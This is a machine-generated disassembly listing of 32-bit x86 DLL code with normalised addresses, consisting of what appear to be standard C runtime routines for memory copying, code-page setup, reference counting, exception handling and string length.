mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000d330 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000d4cc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d330 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d330 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d330 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4cc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4cc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4cc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp sub_1000e8b3
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_1000d521
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1000c7cd
pop ecx
sub_1000d541
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1000bd47
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1000d90a
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000dba6
mov [ esi + 0x4 ] eax
sub_1000d5d0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1000e9dc
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1000d64a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1000d6d9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000d772
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1000c7cd
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1000c7cd
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1000c7cd
push [ esi + 0xc0 ]
call sub_1000c7cd
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1000ea96
push [ esi + 0xd4 ]
call sub_1000c7cd
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1000c7cd
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000c7cd
pop ecx
push [ esi + 0xb0 ]
call sub_1000c7cd
push [ esi + 0xbc ]
call sub_1000c7cd
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1000c7cd
push [ esi + 0xbc ]
call sub_1000ee76
pop ecx
pop ecx
push eax
call sub_1000c7cd
pop ecx
push eax
call sub_1000c7cd
push [ esi + 0xbc ]
call sub_1000ee0d
pop ecx
pop ecx
sub_1000d8bd
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_1000d64a
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_1000d6d9
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000d772
pop ecx
sub_1000d90a
push 0xc
push r--data
call sub_1000c3d0
call sub_1000bd47
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_1000d8bd
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d977
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000bd47
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1000c415
retn
push 0x20
call sub_1000b20b
sub_1000d983
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1000d9b2
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1000d5d0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1000da16
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1000f288
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1000f15b
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1000f15b
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000af0f
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1000d5d0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1000dba6
push 0xc
push r--data
call sub_1000c3d0
call sub_1000bd47
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000dc41
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1000c415
retn
push 0x20
call sub_1000b20b
cmp esi rw-data
je r-xdata
push esi
call sub_1000c7cd
pop ecx
sub_1000dc4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1000d541
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000dcc6
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1000dc4a
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1000d9b2
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000d5d0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000af0f
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1000d983
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1000da16
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1000d5d0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1000d983
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1000deaf
push 0x14
push r--data
call sub_1000c3d0
or [ ebp - 0x20 ] 0xffffffff
call sub_1000bd47
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1000dba6
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1000dc4a
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1000c807
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1000c415
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1000dcc6
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_1000c0bc
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1000c7cd
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1000c7cd
pop ecx
push 0xd
call sub_1000b726
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e010
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1000c7cd
pop ecx
sub_1000e067
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1000c0bc
mov [ eax ] 0x16
call sub_1000bb50
or eax 0xffffffff
pop ebp
retn
sub_1000e0b0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1000e140
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1000f3e5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1000f404
jmp r-xdata
sub_1000e140
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1000af0f
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1000e0b0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000e1a2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1000e1d2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000e210
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000e29b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_1000bb97
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000af0f
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1000e407
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1000c0bc
push 0x16
